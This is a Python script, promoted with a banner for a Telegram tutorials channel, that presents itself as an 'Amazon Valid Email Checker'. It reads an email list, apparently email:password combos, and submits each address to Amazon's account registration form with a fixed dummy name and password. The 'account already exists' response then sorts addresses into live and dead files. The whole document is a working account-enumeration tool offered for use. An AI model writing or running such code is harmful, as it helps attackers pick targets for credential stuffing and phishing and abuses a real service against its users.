
import requests
import os
import sys
os.system('cls||clear')
print("""
\033[31m █████╗ ███╗   ███╗ █████╗ ███████╗ ██████╗ ███╗   ██╗                
\033[31m██╔══██╗████╗ ████║██╔══██╗╚══███╔╝██╔═══██╗████╗  ██║                
\033[31m███████║██╔████╔██║███████║  ███╔╝ ██║   ██║██╔██╗ ██║                
\033[31m██╔══██║██║╚██╔╝██║██╔══██║ ███╔╝  ██║   ██║██║╚██╗██║                
\033[31m██║  ██║██║ ╚═╝ ██║██║  ██║███████╗╚██████╔╝██║ ╚████║                
\033[31m╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                
                                                                      
\033[37m██╗   ██╗ █████╗ ██╗     ██╗██████╗     \033[34m███╗   ███╗ █████╗ ██╗██╗     
\033[37m██║   ██║██╔══██╗██║     ██║██╔══██╗    \033[34m████╗ ████║██╔══██╗██║██║     
\033[37m██║   ██║███████║██║     ██║██║  ██║    \033[34m██╔████╔██║███████║██║██║     
\033[37m╚██╗ ██╔╝██╔══██║██║     ██║██║  ██║    \033[34m██║╚██╔╝██║██╔══██║██║██║     
 \033[37m╚████╔╝ ██║  ██║███████╗██║██████╔╝    \033[34m██║ ╚═╝ ██║██║  ██║██║███████╗
  \033[37m╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝╚═════╝     \033[34m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                      
\033[33m@tutorials_zone | https://t.me/tutorials_zone\033[0m
	""")

print("[+]Amazon Valid Email Checker |--| Atsiksdong.PH[+]")

live = open('Amazon_live.txt', 'w')
dead = open('Amazon_dead.txt', 'w')

Checked = "Checked by Atsiksdong"

print("_"*50)

print("Amazon Valid Email Checker")

print("_"*55)

print(" ")
list= input("Enter Email List :")
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*55)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	baker = email.strip().split(':')
	xxx = {'customerName':'Maskoff','email': baker[0],'emailCheck': baker[0],'password':'Atsiksdong1337','passwordCheck':'Atsiksdong1337'}
	op = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in op:
		print("\033[32;1mLIVE\033[0m | "+email+" | ==> Checked")
		live.write(email + '\n')
	else:
		print("\033[31;1mDEAD\033[0m | "+email+" | ==> Checked")
		dead.write(email + '\n')
print("-"*50)
print("\033[35;1mALL EMAILS CHECKED SUCCESSFULLY\033[0m")
print("Amazon Valid Email was Saved in Amazon_live.txt")

